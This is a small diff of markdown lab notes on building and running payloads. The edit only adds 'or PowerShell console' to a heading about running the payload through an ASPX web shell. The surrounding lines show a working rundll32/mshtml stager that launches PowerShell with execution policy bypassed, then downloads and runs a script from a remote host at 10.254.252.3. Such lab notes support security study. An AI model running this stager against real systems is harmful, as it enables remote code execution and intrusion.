@@ -21,7 +21,7 @@ This lab will focus on creating multiple payloads and then testing them in the s
 # Executing Stager with rundll32.exe
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.254.252.3:8000/setup.ps1');")
 ```
-##### Or we can copy the payload for execution via [[Enterprise Microsoft Exchange server#Interact with the Web Shell|ASPX Web Shell]]
+##### Or we can copy the payload for execution via [[Enterprise Microsoft Exchange server#Interact with the Web Shell|ASPX Web Shell]] or PowerShell console
 ![[Pasted image 20240324025733.png]]
 
 ----
